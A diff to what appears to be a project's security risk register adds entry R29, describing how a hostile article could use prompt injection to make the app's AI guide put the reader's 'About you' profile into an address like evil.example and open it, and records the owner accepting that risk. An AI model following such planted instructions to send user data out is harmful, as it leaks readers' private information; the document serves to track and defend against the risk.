@@ -80,6 +80,7 @@ carrying R8. A qualification beside an id wins over those words.
 | [R26](#r26) | From an AI app on the web, the administrator's agent can publish an article or take its private link with no press | Medium | accepted | none | — |
 | [R27](#r27) | A hostile article can choose which of the reader's own typed sentences saves itself to About you, out of its context | Medium | accepted | none | — |
 | [R28](#r28) | An uploaded file can say it was saved from any address, and a shared article then shows "Saved from" that site | Low | accepted | none | — |
+| [R29](#r29) | A hostile article can have the guide write what it holds, About you included, into a web address it then opens | Medium | accepted | none | — |
 
 ## Accepted
 
@@ -213,6 +214,33 @@ level holds only with the `publicSourceUrl` boundary GPT Sol's plan review asked
 lives: [security-map.md, the saved-from row](security-map.md#where-the-defences-physically-live),
 [261018j](../plans/261018j-a-refused-paper-read-from-europe-pmc-and-a-saved-page-keeps-its-address.md)
 § Stage 3. Undoing it is `savedFromInHtml` returning `null`.
+
+### R29
+
+**A hostile article can have the guide write what it holds into a web address it then opens.**
+Since 2026-10-18 the typed guide has `read_web_page`, and like Chat it may open any address,
+including one the model wrote. Every guide turn carries the reader's reason and About you, so an
+instruction planted in the article can ask for `https://evil.example/<About you>` and a GET
+sends those words to that site: up to 2,048 characters, path included, since the 256-character
+cap is on the query and fragment only. Medium: the reader must open the hostile article and talk
+to the guide about it, the guide reads one page a turn (`READ_WEB_PAGE_PER_TURN_GUIDE`), and
+`PROFILE_RULES` says never to put the profile in a tool argument (prompt text, not a boundary).
+Chat has had the same channel since 2026-08-26, known and never put to Greg as a risk of its own
+([chat-tools.md § Security](chat-tools.md#security-a-tool-result-is-data-and-one-of-them-is-a-strangers)).
+Decision: **accepted by Greg** for the guide, choosing it over an allowlist of handed addresses:
+
+> B
+>
+> — Greg, 2026-10-18 (reply `spya-cab6zp` to [q-g492eq](../user-feedback/questions/q-g492eq.md))
+
+where B read: *"Yes, but as Chat has it: the guide may open any address, including one it writes
+itself. Fewer refusals, but it gains the one way a hostile article could get your About you
+out."* Where it lives: [security-map.md, the `src/chat-tools.ts` row](security-map.md#where-the-defences-physically-live),
+`READ_WEB_PAGE_TOOL` in [`src/chat-tools.ts`](../../src/chat-tools.ts),
+[261017e § Stage 2](../plans/261017e-bring-a-web-page-into-chat.md#stage-2-2b-the-guide-may-open-a-page-as-chat-does).
+The fix, for the guide and Chat alike, is the allowlist in
+[chat-tools.md § Still open](chat-tools.md#still-open) (option A on q-g492eq); undoing it is
+taking `READ_WEB_PAGE_TOOL` out of `GUIDE_TYPED_TOOLS`.
 
 ## Proposed
 
